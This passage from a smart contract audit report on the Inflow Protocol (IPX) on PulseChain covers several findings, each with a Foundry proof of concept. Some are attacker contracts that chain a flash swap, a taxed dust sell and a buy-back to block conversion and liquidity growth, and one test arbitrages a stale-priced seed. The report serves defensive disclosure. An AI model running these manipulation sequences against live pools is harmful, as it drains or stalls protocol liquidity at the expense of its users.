With the shipped configuration and today's pool depth, no rail can open on PulseX V1, and on V2, expansion stops after PRVX. Rail expansion, the protocol's core growth mechanism, stalls and the treasury stage is never reached. The stable reserve, meanwhile, for a rail that cannot open is covered in [I-01]. A code fix needs a 30-day migration to new contracts, although anyone who adds about $250K to the input side of a route pool, or creates a deep V1 USDC/PRVX pool, unblocks that rail without one.

## Proof of Concept

Add the test below as `test/audit/issues/M-03.t.sol` and run:

```bash
forge test --match-path test/audit/issues/M-03.t.sol -vv
```

The test forks PulseChain at block 28,014,811 itself, so it needs network access to `https://rpc.pulsechain.com` and no `--fork-url` flag. It checks every rail on both PulseX factories with the same hop-cap rule as `_twapHopOut()` and logs one row per rail.

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test, console2} from "forge-std/Test.sol";
import {InflowConstants, InflowAddresses} from "../../../src/InflowConstants.sol";

interface IFactory {
    function getPair(address, address) external view returns (address);
}

interface IPair {
    function getReserves() external view returns (uint112, uint112, uint32);
    function token0() external view returns (address);
}

contract Issue_M03 is Test {
    address internal constant PULSEX_V2_FACTORY = 0x29eA7545DEf87022BAdc76323F373EA1e707C523;

    function setUp() public {
        vm.createSelectFork("https://rpc.pulsechain.com", 28_014_811);
    }

    function test_railSeedsUnroutableOnLivePulseX() public view {
        address[4] memory rails =
            [InflowAddresses.PRVX, InflowAddresses.PLSX, InflowAddresses.INC, InflowAddresses.pHEX];
        string[4] memory names = ["PRVX", "PLSX", "INC", "pHEX"];
        bool[4] memory v1;
        bool[4] memory v2;
        for (uint256 i; i < 4; i++) {
            v1[i] = _routable(InflowAddresses.PULSEX_FACTORY, string.concat("V1 ", names[i]), rails[i], InflowConstants.railSeedUsd(i));
            v2[i] = _routable(PULSEX_V2_FACTORY, string.concat("V2 ", names[i]), rails[i], InflowConstants.railSeedUsd(i));
        }

        assertFalse(v1[0], "V1: PRVX seed routable");
        assertTrue(v2[0], "V2: PRVX seed not routable");
        assertFalse(v2[1], "V2: PLSX seed routable");
        assertFalse(v1[2] || v2[2], "INC seed routable");
        assertFalse(v1[3] || v2[3], "pHEX seed routable");
    }

    function _routable(address f, string memory label, address rail, uint256 seed) internal view returns (bool) {
        (uint256 anchorUsdc, uint256 anchorWpls) = _reserves(f, InflowAddresses.USDC, InflowAddresses.WPLS);
        uint256 wplsOut = anchorUsdc == 0
            ? 0
            : (seed * InflowConstants.AMM_FEE_NUM * anchorWpls)
                / (anchorUsdc * InflowConstants.AMM_FEE_DEN + seed * InflowConstants.AMM_FEE_NUM);
        (uint256 hopWpls,) = _reserves(f, InflowAddresses.WPLS, rail);
        (uint256 directUsdc,) = _reserves(f, InflowAddresses.USDC, rail);
        bool viaWpls = _capOk(seed, anchorUsdc) && _capOk(wplsOut, hopWpls);
        bool direct = _capOk(seed, directUsdc);

        console2.log(
            string.concat(
                label,
                " | anchor USDC ",
                vm.toString(anchorUsdc / 1e6),
                " needs ",
                vm.toString(_need(seed) / 1e6),
                " | WPLS/rail WPLS ",
                vm.toString(hopWpls / 1e18),
                " needs ",
                vm.toString(_need(wplsOut) / 1e18),
                " | USDC/rail USDC ",
                vm.toString(directUsdc / 1e6),
                " needs ",
                vm.toString(_need(seed) / 1e6),
                " | routable ",
                vm.toString(viaWpls || direct)
            )
        );
        return viaWpls || direct;
    }

    function _reserves(address f, address a, address b) internal view returns (uint256 ra, uint256 rb) {
        address p = IFactory(f).getPair(a, b);
        if (p == address(0)) return (0, 0);
        (uint112 r0, uint112 r1,) = IPair(p).getReserves();
        (ra, rb) = IPair(p).token0() == a ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
    }

    function _capOk(uint256 amountIn, uint256 rIn) internal pure returns (bool) {
        return rIn != 0 && amountIn * InflowConstants.BPS_DENOMINATOR <= rIn * InflowConstants.EXPANSION_HOP_CAP_BPS;
    }

    function _need(uint256 amountIn) internal pure returns (uint256) {
        return (amountIn * InflowConstants.BPS_DENOMINATOR) / InflowConstants.EXPANSION_HOP_CAP_BPS;
    }
}
```

Observed at block 28,014,811. The first hop of the WPLS route needs at least $250,000 of USDC in the WPLS/USDC anchor: V1 holds $318,483 (passes), V2 holds $9,795 (fails every WPLS route). The second hop needs about 46.0B WPLS on V1 and 31.0B WPLS on V2, and a direct route needs at least $250,000 of USDC.

| Rail | V1 WPLS/rail (WPLS) | V1 USDC/rail (USDC) | Opens on V1            | V2 WPLS/rail (WPLS) | V2 USDC/rail (USDC) | Opens on V2  |
| ---- | ------------------- | ------------------- | ---------------------- | ------------------- | ------------------- | ------------ |
| PRVX | 656,789             | no pool             | No                     | 4.05B               | $364,522            | Yes (direct) |
| PLSX | 96.35B              | $393                | Yes, once PRVX is open | 38.93B              | $387                | No           |
| INC  | 34.06B              | $93                 | No                     | 9.79B               | $697                | No           |
| pHEX | 27.47B              | $0.28               | No                     | 39.55B              | $95,472             | No           |

## Recommendation

Make the swap route or factory configurable per rail behind a timelock, seed the route pools before launch, or let an unroutable rail be skipped behind a timelock so it stops gating the rails after it. Shrinking or splitting the seed does not help in the reported case: the 2% cap on the V1 WPLS/PRVX pool allows about 13K WPLS (about $0.07) per hop, and a depth check before `lockRails()` is only a snapshot. Also align `AUDIT_BRIEF.md` and the deploy defaults on one PulseX version, and correct the stale comments in `InflowConstants.sol`.

## Team Response

Fixed.

# [L-01] A Declined WPLS Conversion Leg Still Starts the Cooldown, so a Seller Can Block IPX-to-WPLS Conversion

## Severity

Low Risk

## Description

A conversion round sells vault IPX in three legs: a seed leg and a stable leg (together, the stable side) and a WPLS leg. Before each leg, the module compares the pool's spot price with its TWAP and declines the leg if they differ by more than 10%. A declined leg swaps nothing, and the round still counts as complete.

The protocol already handles a declined stable side carefully: the round is marked partial and starts no cooldown, so an honest round can follow straight after. The README promises that a seller "cannot hold back the honest round behind it", but the code delivers this only for the stable side. A declined WPLS leg is simply dropped (`ConversionModule.sol` L273-L277), and only a declined seed or stable leg marks the round partial (L286-L298). The vault therefore starts the 30-minute cooldown (`VaultController.sol` L591), even though the largest leg of the round did nothing.

Only a downward push on IPX/WPLS works. A buy that pushes IPX up trips the momentum gate (`VaultController.sol` L1493-L1500, 5% above the IPX/WPLS TWAP), which blocks conversion entirely. A plain sell into IPX/WPLS after the cooldown expires does not work either, because the cycle runs inside that sell before the price moves (`IPXToken.sol` L436-L443), so the honest round lands first.

A seller can still do it in one transaction:

1. Flash-swap WPLS out of IPX/WPLS and repay in IPX inside `uniswapV2Call()`. The repayment is a taxed sell that runs the cycle while the pair is locked, so the WPLS leg fails, `IncompleteConversion` (`VaultController.sol` L547) rolls the cycle back and no cooldown starts. Once the swap settles, IPX/WPLS sits more than 10% below its TWAP.
2. Send a taxed sell of at least 200 wei into IPX/USDC. The cycle runs, the WPLS leg is declined, the stable side fills and the cooldown starts.
3. Buy the IPX back. Buys do not run the cycle.

Two other routes also work: once a rail is open, a pair-to-pair hop through the IPX/rail pair, which never runs the cycle, or a push in the block just before the cooldown expires, which leaves the price exposed to arbitrage for one block.

The same round then reaches deployment, where the deployer's 5% TWAP guard on the IPX/WPLS leg (`LiquidityDeployer.sol` L455-L466, `_twapGuard()` L693-L713) declines that leg too. The IPX/WPLS pool gets neither conversion nor new POL for the window.

A 10% move needs a little over 5.4% of the pool's IPX reserve. Round-tripping it costs about 1.58% of that amount (0.5% sell tax, 0.5% buy tax and two 0.29% swap fees). That is about 0.09% of the pool's IPX side per window, or about 4% per day, and roughly 63% of it is tax paid to the vault. The attacker also has to be the first seller after every expiry, ahead of the keeper's `poke()`.

A declined WPLS leg is not treated as a partial round, unlike a declined stable side, so it consumes the shared cooldown.

## Location of Affected Code

File: [src/ConversionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol)

- `execute()` (L210-L304)
  - stable-side pre-check (L239-L246)
  - WPLS leg result (L273-L277)
  - partial-round marking (L286-L298)
- `_legQuote()` (L529-L567)
- `maxLegDeviationBps` (L77)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `_runCycle()` (L409-L626)
  - `IncompleteConversion` (L547)
  - cooldown start (L591)
- `_inBullishMomentum()` (L1493-L1500)

File: [src/LiquidityDeployer.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol)

- `_addLiquidityWpls()` (L444-L518): IPX/WPLS TWAP guard (L461-L465)
- `_twapGuard()` (L693-L713)

File: [src/IPXToken.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/IPXToken.sol)

- `_update()` (L384-L446): cycle trigger (L438-L445)

File: [README.md](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/README.md)

- conversion-leg residual (L433-L439)

## Impact

A seller can hold IPX-to-WPLS conversion and new IPX/WPLS liquidity at zero for every 30-minute window they pay for, while only the smaller stable side keeps converting. Nothing is lost: the unconverted IPX stays in the vault and is sold once the attacker stops. The attacker gains nothing and pays about 0.09% of the pool's IPX side per window, most of it as tax to the vault.

## Proof of Concept

Add the test below as `test/audit/issues/L-01.t.sol` and run:

```bash
forge test --match-path test/audit/issues/L-01.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {IPXToken} from "../../../src/IPXToken.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {MockUniswapV2Pair, IUniswapV2Callee} from "../../mocks/MockUniswapV2Pair.sol";
import {MockUniswapV2Router} from "../../mocks/MockUniswapV2Router.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

contract WplsLegBlocker is IUniswapV2Callee {
    IPXToken internal immutable ipx;
    MockERC20 internal immutable wpls;
    MockUniswapV2Pair internal immutable pair;
    MockUniswapV2Router internal immutable router;
    address internal immutable ipxUsdcPair;
    uint256 internal repay;

    constructor(IPXToken _ipx, MockERC20 _wpls, MockUniswapV2Pair _pair, MockUniswapV2Router _router, address _ipxUsdcPair) {
        ipx = _ipx;
        wpls = _wpls;
        pair = _pair;
        router = _router;
        ipxUsdcPair = _ipxUsdcPair;
    }

    function attack(uint256 wplsOut) external {
        (uint112 r0, uint112 r1,) = pair.getReserves();
        bool ipxIs0 = pair.token0() == address(ipx);
        (uint256 ipxRes, uint256 wplsRes) = ipxIs0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 amountIn = (ipxRes * wplsOut * InflowConstants.AMM_FEE_DEN)
            / ((wplsRes - wplsOut) * InflowConstants.AMM_FEE_NUM) + 1;
        repay = (amountIn * InflowConstants.BPS_DENOMINATOR) / (InflowConstants.BPS_DENOMINATOR - ipx.sellTaxBps()) + 1;
        pair.swap(ipxIs0 ? 0 : wplsOut, ipxIs0 ? wplsOut : 0, address(this), bytes("push"));

        ipx.transfer(ipxUsdcPair, 200);

        address[] memory path = new address[](2);
        path[0] = address(wpls);
        path[1] = address(ipx);
        wpls.approve(address(router), wplsOut);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(wplsOut, 0, path, address(this), type(uint256).max);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        ipx.transfer(address(pair), repay);
    }
}

contract Issue_L01 is InflowFixture {
    WplsLegBlocker internal attacker;

    function setUp() public override {
        super.setUp();
        vm.startPrank(owner);
        vault.setTWAPOracle(address(twapOracle));
        conversion.setTWAPOracle(address(twapOracle));
        deployer.setTWAPOracle(address(twapOracle));
        arb.setTWAPOracle(address(twapOracle));
        vm.stopPrank();
        vm.warp(block.timestamp + twapOracle.windowSeconds() + 1);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        twapOracle.update(wplsUsdcPair);
        vm.warp(block.timestamp + 70 minutes);
        deal(address(wpls), address(vault), 2_000e18 + vault.wplsFloor());
        deal(address(usdc), address(vault), 2_000e6 + vault.stableFloor());
        attacker = new WplsLegBlocker(ipx, wpls, MockUniswapV2Pair(ipxWplsPair), router, ipxUsdcPair);
        deal(address(ipx), address(attacker), ipx.balanceOf(ipxWplsPair) / 5);
    }

    function test_declinedWplsLegStartsCooldown() public {
        uint256 vaultIpx0 = ipx.balanceOf(address(vault));
        uint256 vaultWpls0 = wpls.balanceOf(address(vault));
        uint256 lpWpls0 = IERC20(ipxWplsPair).balanceOf(address(lpLocker));

        uint256 snap = vm.snapshotState();
        _sellIpxForWpls(bob, 1_000e18);
        assertGt(IERC20(ipxWplsPair).balanceOf(address(lpLocker)), lpWpls0, "control: honest round added no IPX/WPLS POL");
        vm.revertToState(snap);

        uint256 attackerIpx0 = ipx.balanceOf(address(attacker));
        uint256 poolIpx0 = ipx.balanceOf(ipxWplsPair);

        attacker.attack(wpls.balanceOf(ipxWplsPair) * 6 / 100);

        uint256 cost = attackerIpx0 - ipx.balanceOf(address(attacker));
        console2.log("attacker IPX cost per window          :", cost / 1e18);
        console2.log("cost in bps of the IPX/WPLS IPX side  :", cost * 10_000 / poolIpx0);
        assertLt(ipx.balanceOf(address(vault)), vaultIpx0, "stable side converted");
        assertEq(wpls.balanceOf(address(vault)), vaultWpls0, "vault received or deployed WPLS");
        assertEq(IERC20(ipxWplsPair).balanceOf(address(lpLocker)), lpWpls0, "IPX/WPLS POL added");
        assertEq(vault.lastExecutionTime(), block.timestamp, "cooldown not started");

        vm.warp(block.timestamp + 10 minutes);
        uint256 vaultIpx1 = ipx.balanceOf(address(vault));
        _sellIpxForWpls(bob, 1_000e18);
        assertEq(vault.lastExecutionTime(), block.timestamp - 10 minutes, "honest round ran");
        assertGe(ipx.balanceOf(address(vault)), vaultIpx1, "vault IPX converted in the window");
        assertEq(wpls.balanceOf(address(vault)), vaultWpls0, "vault received WPLS in the window");
    }
}
```

The attack costs the attacker 9 bps of the IPX/WPLS pool's IPX side for the window.

## Recommendation

Treat a declined WPLS leg like a declined stable side: mark the round as partial, start no cooldown, and count it toward the same one-partial-round limit. A second WPLS-declined round in the same period should then be reported incomplete and rolled back, as `ConversionModule.sol` L290-L291 already does for the stable side. Optionally, defer such a round up front, like the stable side's pre-check (L239-L246). Starting the cooldown only when every leg is filled, without that cap, would be unsafe: a seller holding the WPLS leg off could then force a stable-only round on every sell.

This limits the attack rather than removing it: a seller can still force one stable-only round per period, but can no longer block the honest round behind it.

## Team Response

Fixed.

# [L-02] The First Rail Seed Into an Empty Pair Is Priced Only From TWAPs, so a Sharp IPX Price Move Lets Arbitrage Take Part of the Seed

## Severity

Low Risk

## Description

When the protocol seeds a new, empty IPX/rail pair, it sizes the IPX leg from the WPLS/stable and IPX/WPLS TWAPs alone and opens the pool at that ratio.

Nothing on this path compares the current IPX/WPLS spot price with its TWAP. The route checks cover only the stable, WPLS and rail pools, the vault's guard covers only the WPLS/stable pool, and the momentum check blocks conversion but not expansion. Contributions to live pairs and base liquidity additions do check spot against TWAP. The first seed does not. If IPX has moved sharply since the last window, the new pool opens at the stale price and arbitrage takes the difference out of the protocol's liquidity.

The first seed has no spot-versus-TWAP check.

## Location of Affected Code

File: [src/ExpansionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ExpansionModule.sol)

- `_planSeed()` (L887-L965)
- `_usdcToIpx()` (L1313-L1317)
- `_ipxLegForRail()` (L1076-L1083)
- `_addRailLiquidity()` (L831-L876)

## Impact

If a rail opens during a sharp IPX price move, the new pool opens at the stale TWAP price instead of the current one. Arbitrageurs then trade it back to the market price and take the difference out of the protocol's seed liquidity. No attacker is needed, only a sharp price move around the time the rail opens.

## Proof of Concept

Add the test below as `test/audit/issues/L-03.t.sol` and run:

```bash
forge test --match-path test/audit/issues/L-03.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {MockUniswapV2Pair} from "../../mocks/MockUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

contract Issue_L12 is InflowFixture {
    function test_firstSeedOpensAtStalePrice_arbitrageTakesSeed() public {
        _seedExpansionPools(); // base TWAPs pinned at the current price

        // IPX drops 30% on IPX/WPLS since the last window; the oracle is not updated.
        uint256 wplsRes = wpls.balanceOf(ipxWplsPair);
        deal(address(wpls), ipxWplsPair, (wplsRes * 70) / 100);
        MockUniswapV2Pair(ipxWplsPair).sync();

        // The seed runs and opens the IPX/PRVX pool at the stale TWAP ratio.
        uint256 spent = _checkExpansionAsVault();
        assertEq(spent, InflowConstants.railSeedUsd(0), "seed did not run");
        address pair = factory.getPair(address(ipx), address(prvx));
        (uint256 ipxRes, uint256 prvxRes) = _reserves(pair);
        uint256 poolIpxPerPrvx = (ipxRes * 1e18) / prvxRes;
        uint256 fairIpxPerPrvx = _spotIpxPerPrvx();
        console2.log("pool IPX per PRVX :", poolIpxPerPrvx);
        console2.log("fair IPX per PRVX :", fairIpxPerPrvx);
        assertLt(poolIpxPerPrvx, (fairIpxPerPrvx * 75) / 100, "pool did not open at the stale price");

        // Arbitrage: IPX is overpriced in the new pool, so sell IPX into it until
        // its price reaches the fair one (ipx' = ipx0 * sqrt(fair / pool)).
        uint256 target = _sqrt(ipxRes * ipxRes * fairIpxPerPrvx / poolIpxPerPrvx);
        uint256 ipxIn = ((target - ipxRes) * 10_000) / 9_971;
        // The reserve wallet is fee-exempt, so the sell is a plain swap (no tax, no cycle).
        address[] memory path = new address[](2);
        path[0] = address(ipx);
        path[1] = address(prvx);
        vm.startPrank(reserveWallet);
        ipx.approve(address(router), ipxIn);
        uint256 prvxBefore = prvx.balanceOf(reserveWallet);
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(ipxIn, 0, path, reserveWallet, type(uint256).max);
        vm.stopPrank();
        uint256 prvxOut = prvx.balanceOf(reserveWallet) - prvxBefore;

        // Value both legs in WPLS at current spot: PRVX via WPLS/PRVX, IPX via IPX/WPLS.
        uint256 prvxValueWpls = _quote(factory.getPair(address(prvx), address(wpls)), address(prvx), prvxOut);
        uint256 ipxCostWpls = _quote(ipxWplsPair, address(ipx), ipxIn);
        console2.log("arbitrageur profit (WPLS wei):", prvxValueWpls - ipxCostWpls);
        console2.log("profit in bps of the $5,000 seed:", (prvxValueWpls - ipxCostWpls) * 10_000 / 5_000e18);
        assertGt(prvxValueWpls, ipxCostWpls, "arbitrage was not profitable");
    }

    function _reserves(address pair) internal view returns (uint256 ipxRes, uint256 prvxRes) {
        (uint112 r0, uint112 r1,) = MockUniswapV2Pair(pair).getReserves();
        (ipxRes, prvxRes) = MockUniswapV2Pair(pair).token0() == address(ipx)
            ? (uint256(r0), uint256(r1))
            : (uint256(r1), uint256(r0));
    }

    /// Fair IPX per PRVX (1e18 scaled) from current spot: PRVX -> WPLS -> IPX.
    function _spotIpxPerPrvx() internal view returns (uint256) {
        uint256 wplsPerPrvx = _quote(factory.getPair(address(prvx), address(wpls)), address(prvx), 1e18);
        return _quote(ipxWplsPair, address(wpls), wplsPerPrvx);
    }

    /// Spot value of `amountIn` of `tokenIn` in the other token of `pair` (no fee, no impact).
    function _quote(address pair, address tokenIn, uint256 amountIn) internal view returns (uint256) {
        (uint112 r0, uint112 r1,) = MockUniswapV2Pair(pair).getReserves();
        (uint256 rIn, uint256 rOut) = MockUniswapV2Pair(pair).token0() == tokenIn
            ? (uint256(r0), uint256(r1))
            : (uint256(r1), uint256(r0));
        return (amountIn * rOut) / rIn;
    }

    function _sqrt(uint256 x) internal pure returns (uint256 y) {
        uint256 z = (x + 1) / 2;
        y = x;
        while (z < y) { y = z; z = (x / z + z) / 2; }
    }
}
```

## Recommendation

Require the IPX/WPLS spot price to be within the 5% expansion band of its TWAP before seeding a new rail pair.

## Team Response

Fixed.

# [L-03] A Seller Can Make a Round Convert but Add No Liquidity and Still Start the Cooldown, so Base Liquidity Stops Growing

## Severity

Low Risk

## Description

Each cycle first converts part of the vault's IPX into WPLS and stable (the conversion legs), then adds liquidity to the IPX/WPLS and IPX/stable pools (the liquidity legs). A round that converts starts a 30-minute cooldown, and until it ends, no other round converts or adds liquidity.

Both steps compare each pool's current price with its TWAP, but with different limits:

1. a conversion leg goes ahead if the pool is within 10% of its TWAP;
2. a liquidity leg is skipped if the pool is more than 5% off its TWAP.

A skipped liquidity leg does not revert. The round keeps its conversion, starts the cooldown and adds no liquidity. So when both pools sit between 5% and 10% off their TWAPs, the round converts into both pools but adds liquidity to neither.

A seller can set this up in one transaction:

1. Push IPX/WPLS 5-10% below its TWAP with a flash swap: take WPLS out of the pool and repay in IPX. The repayment is a taxed sell, so it runs the cycle, but the pool is still locked, so that cycle fails, is rolled back and starts with no cooldown. A plain sell would not work, because it runs the cycle before the price moves.
2. Push IPX/USDC 5-10% above its TWAP with an ordinary buy. Buys do not run the cycle.
3. Trigger the cycle with a 200-wei taxed IPX sell. Both conversion legs go ahead, both liquidity legs are skipped, and the cooldown starts.
4. Undo both pushes.

Repeated whenever the cooldown ends, this stops the protocol from adding liquidity to its base pools, while it keeps converting. In this attack, every conversion leg fills; only the liquidity is missing.

Conversion goes ahead in pools that the liquidity step then refuses (its limit is 10%, the liquidity limit is 5%), and the seller who triggers a round can put both base pools in that gap.

## Location of Affected Code

File: [src/LiquidityDeployer.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/LiquidityDeployer.sol)

- `_addLiquidityWpls()` (L444-L518)
- `_addLiquidityStable()` (L522-L588)
- `_twapGuard()` (L693-L713)
- `TWAP_LP_MAX_DEVIATION_BPS` (L686)

File: [src/ConversionModule.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/ConversionModule.sol)

- `_legQuote()` (L529-L567)
- `maxLegDeviationBps` (L77)

File: [src/VaultController.sol](https://github.com/InflowProtocolX/Audit-InflowProtocolX/blob/35b939c1e8c54c7d3c7c693eaf13035998306cff/src/VaultController.sol)

- `_runCycle()` (L409-L626)
  - deployment (L578)
  - cooldown start (L591)

## Impact

While the attack lasts, the protocol adds no liquidity to its base pools, which at stage 0 is all of its deployment. Its locked liquidity stops growing through deployment, so the stages that need more of it are not reached, and the converted WPLS and stable sit unused in the vault. Nothing is lost: the funds stay in the vault and are deployed once the attack stops. The attacker has to act first after every cooldown, ahead of other sellers and the keeper's `poke()`, and pays each time: about $5.50 per window with the launch-size pools in the test, rising in proportion to the pools.

## Proof of Concept

The test first shows an honest round (the control), which adds liquidity to both pools. Then an attacker contract runs the four steps in one transaction, with the launch-size pools ($6,389 of WPLS and $3,593 of USDC). Both conversion legs fill, no liquidity is added and the cooldown starts. An honest sell ten minutes later adds no liquidity either.

Add the test below as `test/audit/issues/L-02.t.sol` and run:

```bash
forge test --match-path test/audit/issues/L-02.t.sol -vv
```

```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {InflowFixture} from "../../InflowFixture.sol";
import {InflowConstants} from "../../../src/InflowConstants.sol";
import {IPXToken} from "../../../src/IPXToken.sol";
import {MockERC20} from "../../mocks/MockERC20.sol";
import {MockUniswapV2Pair, IUniswapV2Callee} from "../../mocks/MockUniswapV2Pair.sol";
import {MockUniswapV2Router} from "../../mocks/MockUniswapV2Router.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {console2} from "forge-std/console2.sol";

contract BaseLegBlocker is IUniswapV2Callee {
    IPXToken internal immutable ipx;
    MockERC20 internal immutable wpls;
    MockERC20 internal immutable usdc;
    MockUniswapV2Pair internal immutable ipxWpls;
    address internal immutable ipxUsdc;
    MockUniswapV2Router internal immutable router;
    uint256 internal repay;

    constructor(
        IPXToken _ipx,
        MockERC20 _wpls,
        MockERC20 _usdc,
        MockUniswapV2Pair _ipxWpls,
        address _ipxUsdc,
        MockUniswapV2Router _router
    ) {
        ipx = _ipx;
        wpls = _wpls;
        usdc = _usdc;
        ipxWpls = _ipxWpls;
        ipxUsdc = _ipxUsdc;
        router = _router;
    }

    function attack(uint256 wplsOut, uint256 usdcIn) external {
        (uint112 r0, uint112 r1,) = ipxWpls.getReserves();
        bool ipxIs0 = ipxWpls.token0() == address(ipx);
        (uint256 ipxRes, uint256 wplsRes) = ipxIs0 ? (uint256(r0), uint256(r1)) : (uint256(r1), uint256(r0));
        uint256 amountIn = (ipxRes * wplsOut * InflowConstants.AMM_FEE_DEN)
            / ((wplsRes - wplsOut) * InflowConstants.AMM_FEE_NUM) + 1;
        repay = (amountIn * InflowConstants.BPS_DENOMINATOR) / (InflowConstants.BPS_DENOMINATOR - ipx.sellTaxBps()) + 1;
        ipxWpls.swap(ipxIs0 ? 0 : wplsOut, ipxIs0 ? wplsOut : 0, address(this), bytes("push"));
        uint256 ipxBought = _swap(address(usdc), address(ipx), usdcIn);

        ipx.transfer(ipxUsdc, 200);

        _swap(address(wpls), address(ipx), wplsOut);
        _swap(address(ipx), address(usdc), ipxBought);
    }

    function uniswapV2Call(address, uint256, uint256, bytes calldata) external {
        ipx.transfer(address(ipxWpls), repay);
    }

    function _swap(address tokenIn, address tokenOut, uint256 amountIn) internal returns (uint256 out) {
        address[] memory path = new address[](2);
        path[0] = tokenIn;
        path[1] = tokenOut;
        IERC20(tokenIn).approve(address(router), amountIn);
        uint256 before = IERC20(tokenOut).balanceOf(address(this));
        router.swapExactTokensForTokensSupportingFeeOnTransferTokens(amountIn, 0, path, address(this), type(uint256).max);
        out = IERC20(tokenOut).balanceOf(address(this)) - before;
    }
}

contract Issue_L06 is InflowFixture {
    BaseLegBlocker internal attacker;

    function setUp() public override {
        super.setUp();
        vm.startPrank(owner);
        vault.setTWAPOracle(address(twapOracle));
        conversion.setTWAPOracle(address(twapOracle));
        deployer.setTWAPOracle(address(twapOracle));
        arb.setTWAPOracle(address(twapOracle));
        vm.stopPrank();
        vm.warp(block.timestamp + twapOracle.windowSeconds() + 1);
        twapOracle.update(ipxWplsPair);
        twapOracle.update(ipxUsdcPair);
        twapOracle.update(wplsUsdcPair);
        vm.warp(block.timestamp + 70 minutes);
        deal(address(wpls), address(vault), 2_000e18 + vault.wplsFloor());
        deal(address(usdc), address(vault), 2_000e6 + vault.stableFloor());
        attacker = new BaseLegBlocker(ipx, wpls, usdc, MockUniswapV2Pair(ipxWplsPair), ipxUsdcPair, router);
        deal(address(ipx), address(attacker), ipx.balanceOf(ipxWplsPair) / 10);
        usdc.mint(address(attacker), usdc.balanceOf(ipxUsdcPair) / 10);
    }

    function _lockedLp(address pair) internal view returns (uint256) {
        return IERC20(pair).balanceOf(address(lpLocker));
    }

    function _usd(address who) internal view returns (uint256) {
        uint256 w = twapOracle.consult(ipxWplsPair, address(ipx), ipx.balanceOf(who)) + wpls.balanceOf(who);
        return twapOracle.consult(wplsUsdcPair, address(wpls), w) + usdc.balanceOf(who);
    }

    function test_declinedLpLegsStillStartCooldown() public {
        uint256 lpW = _lockedLp(ipxWplsPair);
        uint256 lpS = _lockedLp(ipxUsdcPair);

        uint256 snap = vm.snapshotState();
        vm.prank(bob);
        ipx.transfer(ipxUsdcPair, 200);
        assertGt(_lockedLp(ipxWplsPair), lpW, "control: IPX/WPLS POL grew");
        assertGt(_lockedLp(ipxUsdcPair), lpS, "control: IPX/USDC POL grew");
        vm.revertToState(snap);

        uint256 vaultWpls0 = wpls.balanceOf(address(vault));
        uint256 vaultUsdc0 = usdc.balanceOf(address(vault));
        uint256 value0 = _usd(address(attacker));
        attacker.attack((wpls.balanceOf(ipxWplsPair) * 36) / 1000, (usdc.balanceOf(ipxUsdcPair) * 35) / 1000);
        console2.log("IPX/WPLS pool (WPLS, $1 each):", wpls.balanceOf(ipxWplsPair) / 1e18);
        console2.log("IPX/USDC pool (USDC):", usdc.balanceOf(ipxUsdcPair) / 1e6);
        console2.log("attacker cost for the window (USDC, 6 dec):", value0 - _usd(address(attacker)));

        assertGt(wpls.balanceOf(address(vault)), vaultWpls0, "WPLS conversion leg did not fill");
        assertGt(usdc.balanceOf(address(vault)), vaultUsdc0, "stable conversion leg did not fill");
        assertEq(_lockedLp(ipxWplsPair), lpW, "IPX/WPLS liquidity added");
        assertEq(_lockedLp(ipxUsdcPair), lpS, "IPX/USDC liquidity added");
        assertEq(vault.lastExecutionTime(), block.timestamp, "cooldown not started");

        vm.warp(block.timestamp + 10 minutes);
        _sellIpxForWpls(alice, 1_000e18);
        assertEq(_lockedLp(ipxWplsPair), lpW, "IPX/WPLS liquidity added in the window");
        assertEq(_lockedLp(ipxUsdcPair), lpS, "IPX/USDC liquidity added in the window");
    }
}
```

## Recommendation

Do not convert into a pool that the liquidity step would then refuse: decline a conversion leg unless the pool would still pass the liquidity step's 5% check (`_twapGuard()`) after the conversion's own trade. Conversion and liquidity then agree on which pools are usable, so a round can no longer convert into both pools while adding liquidity to neither.

## Team Response

Fixed.

# [L-04] A Migration That Replaces an Active Rail Keeps That Slot's Active Flag, so the New Rail Is Never Seeded and the Next Rail Can Never Open

## Severity

Low Risk

## Description

Rails open in order: PRVX, PLSX, INC, then pHEX. When a rail opens, the protocol creates its IPX/rail pool, registers it for tax and locks the first liquidity in it. The next rail can open only when the previous rail is active and its IPX/rail pool holds at least $25,000 of protocol-owned liquidity. Whether a rail is active is stored as one flag per slot (slot 0 to 3), not per token.

